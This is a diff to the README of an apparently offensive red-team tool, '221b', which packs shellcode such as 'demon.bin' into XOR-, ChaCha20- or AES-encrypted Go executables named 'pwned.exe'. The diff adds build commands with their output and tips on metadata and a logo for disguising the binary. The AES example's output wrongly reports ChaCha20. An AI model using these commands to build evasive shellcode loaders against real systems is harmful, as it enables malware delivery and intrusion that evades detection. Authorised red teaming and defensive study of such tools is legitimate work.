@@ -40,10 +40,59 @@ Global Flags:
 
 ```
 
-## Example
+## Binary properties
+
+It is possible to add a certain number of metadata as well as a logo via the folder named `misc`. 
+
+also remember to modify the `versioninfo.json` file at the root of the project 
+
+
+here's a preview of the final rendering, so don't ignore this part when planning a red team operation. 
+
+![](/img/preview.png)
+
+
+## Possible execution methods
+
+### XOR : 
 
 ```shell
-221b bake -k shflfhje -s test.sh
+221b bake -k "@ShLkHms221b" -s /PathToShellcode/demon.bin -o pwned.exe
+[+] use xor encryption method
+[+] encrypting demon.bin
+[+] loading encrypted shell into payload
+[+] compiling binary
+go: added golang.org/x/crypto v0.11.0
 go: added golang.org/x/sys v0.10.0
-[+] file compiled to ./test.exe
+[+] file compiled to pwned.exe
 ```
+
+### Chacha20
+
+```shell
+221b bake -m chacha20 -k "0123456789ABCDEF1123345611111111" -s /PathToShellcode/demon.bin -o pwned.exe
+[+] use chacha20 encryption method
+[+] encrypting demon.bin
+[+] loading encrypted shell into payload
+[+] compiling binary
+go: added golang.org/x/crypto v0.11.0
+go: added golang.org/x/sys v0.10.0
+[+] file compiled to pwned.exe
+```
+
+
+### AES
+
+```shell
+221b bake -m aes -k "0123456789ABCDEF1123345611111111" -s /PathToShellcode/demon.bin -o pwned.exe
+[+] use chacha20 encryption method
+[+] encrypting demon.bin
+[+] loading encrypted shell into payload
+[+] compiling binary
+go: added golang.org/x/crypto v0.11.0
+go: added golang.org/x/sys v0.10.0
+[+] file compiled to pwned.exe
+```
+
+
+
